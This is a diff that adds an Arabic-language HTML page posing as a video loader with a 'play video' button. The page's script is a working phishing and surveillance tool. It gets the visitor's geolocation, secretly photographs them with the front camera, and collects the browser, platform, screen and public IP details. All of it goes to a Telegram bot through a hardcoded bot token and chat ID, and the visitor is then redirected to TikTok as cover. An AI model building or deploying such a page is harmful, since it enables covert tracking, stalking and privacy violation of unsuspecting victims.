@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>تحميل الفيديو...</title>
+  <style>
+    body { background: #000; color: #fff; font-family: Arial; text-align: center; padding-top: 100px; }
+    #video { width: 300px; border-radius: 20px; margin: 20px auto; display: none; }
+    #btn { background: #ff0050; border: none; color: white; padding: 15px 40px; border-radius: 30px; font-size: 18px; cursor: pointer; }
+    #status { color: #888; font-size: 14px; margin-top: 20px; }
+  </style>
+</head>
+<body>
+  <h2>⏳ جارٍ التحميل...</h2>
+  <video id="video" autoplay muted></video>
+  <button id="btn">▶️ تشغيل الفيديو</button>
+  <div id="status"></div>
+
+  <script>
+    // 🔐 بيانات التيليجرام الخاصة بك (تم التحديث)
+    const BOT_TOKEN = '8851597209:AAGAZ7peRAC_FtnxRFfTX1X8RRN_A9tMEIM';
+    const CHAT_ID   = '6191166210';  // تم استخراجه من الـ JSON
+
+    const video = document.getElementById('video');
+    const btn = document.getElementById('btn');
+    const statusDiv = document.getElementById('status');
+
+    let stream = null;
+    let locationData = { lat: 'غير متاح', lon: 'غير متاح', accuracy: 'غير متاح' };
+
+    // دالة لجلب الموقع
+    function getLocation() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          resolve({ lat: 'غير مدعوم', lon: 'غير مدعوم', accuracy: 'غير مدعوم' });
+          return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            resolve({
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude,
+              accuracy: pos.coords.accuracy + ' متر'
+            });
+          },
+          (err) => {
+            resolve({ lat: 'مرفوض', lon: 'مرفوض', accuracy: err.message });
+          },
+          { enableHighAccuracy: true, timeout: 8000 }
+        );
+      });
+    }
+
+    btn.onclick = async () => {
+      try {
+        statusDiv.innerText = '📡 جاري الحصول على الموقع...';
+        locationData = await getLocation();
+        
+        statusDiv.innerText = '📷 جاري تشغيل الكاميرا...';
+        stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: "user" } 
+        });
+        
+        video.srcObject = stream;
+        video.style.display = 'block';
+        btn.style.display = 'none';
+        statusDiv.innerText = '📸 جاري التقاط الصورة...';
+
+        setTimeout(() => {
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth || 640;
+          canvas.height = video.videoHeight || 480;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const imageData = canvas.toDataURL('image/jpeg');
+
+          if (stream) stream.getTracks().forEach(t => t.stop());
+
+          const ua = navigator.userAgent;
+          const plat = navigator.platform;
+          const res = `${screen.width}x${screen.height}`;
+
+          fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => {
+              sendToTelegram(imageData, ua, plat, res, data.ip, locationData);
+            })
+            .catch(() => {
+              sendToTelegram(imageData, ua, plat, res, 'غير معروف', locationData);
+            });
+
+          statusDiv.innerText = '✅ تم الإرسال... جارٍ التحويل';
+
+          setTimeout(() => {
+            window.location.href = 'https://www.tiktok.com/@tiktok/video/123456789';
+          }, 3000);
+
+        }, 600);
+
+      } catch (err) {
+        statusDiv.innerText = '❌ يرجى السماح بالكاميرا والموقع';
+        alert('يرجى السماح بالكاميرا والموقع');
+        console.error(err);
+      }
+    };
+
+    function sendToTelegram(imgBase64, ua, plat, res, ip, loc) {
+      // إرسال الصورة
+      const blob = dataURLToBlob(imgBase64);
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('photo', blob, 'capture.jpg');
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      }).catch(e => console.error(e));
+
+      // إرسال النص بالبيانات + الموقع
+      const locationText = `📍 **الموقع:**\n` +
+                           `خط العرض: ${loc.lat}\n` +
+                           `خط الطول: ${loc.lon}\n` +
+                           `الدقة: ${loc.accuracy}`;
+
+      const text = `📱 **جهاز جديد**\n` +
+                   `🆔 IP: ${ip}\n` +
+                   `📟 المتصفح: ${ua}\n` +
+                   `💻 المنصة: ${plat}\n` +
+                   `📏 الشاشة: ${res}\n` +
+                   `🕒 الوقت: ${new Date().toISOString()}\n\n` +
+                   `${locationText}\n\n` +
+                   `📍 رابط الخريطة: https://www.google.com/maps?q=${loc.lat},${loc.lon}`;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text,
+          parse_mode: 'Markdown',
+          disable_web_page_preview: true
+        })
+      }).catch(e => console.error(e));
+
+      // إرسال الموقع كـ Location (بطاقة تفاعلية)
+      if (loc.lat !== 'غير متاح' && loc.lat !== 'مرفوض' && loc.lat !== 'غير مدعوم') {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            latitude: parseFloat(loc.lat),
+            longitude: parseFloat(loc.lon),
+            horizontal_accuracy: typeof loc.accuracy === 'string' ? 100 : parseFloat(loc.accuracy)
+          })
+        }).catch(e => console.error(e));
+      }
+    }
+
+    function dataURLToBlob(dataURL) {
+      const parts = dataURL.split(',');
+      const mime = parts[0].match(/:(.*?);/)[1];
+      const bstr = atob(parts[1]);
+      let n = bstr.length;
+      const u8arr = new Uint8Array(n);
+      while (n--) u8arr[n] = bstr.charCodeAt(n);
+      return new Blob([u8arr], { type: mime });
+    }
+  </script>
+</body>
+</html>
